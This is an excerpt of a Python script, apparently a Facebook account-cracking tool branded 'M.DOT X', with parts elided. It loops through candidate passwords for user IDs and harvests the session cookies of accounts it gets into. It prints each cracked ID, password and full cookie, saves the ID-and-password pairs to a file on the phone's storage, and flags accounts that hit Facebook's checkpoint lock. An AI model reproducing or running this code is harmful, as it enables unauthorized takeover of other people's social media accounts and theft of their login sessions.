...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=61554608912201/')
logo = (""" 
 ____    ____     ______      ___    _________   ____  ____   
|_   \  /   _|   |_   _ `.  .'   `. |  _   _  | |_  _||_  _|  
  |   \/   |       | | `. \/  .-.  \|_/ | | \_|   \ \  / /    
  | |\  /| |       | |  | || |   | |    | |        > `' <     
 _| |_\/_| |_  _  _| |_.' /\  `-'  /   _| |_     _/ /'`\ \_   
|_____||_____|(_)|______.'  `.___.'   |_____|   |____||____|  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[M.DOT X-OK💀] ' +uid+ ' | ' +ps+    '  \n[‎‎🏵️]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/M dot x-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;33m [login-CP☠️] ' +uid+ ' | ' +ps+           '  \33[0;95m')
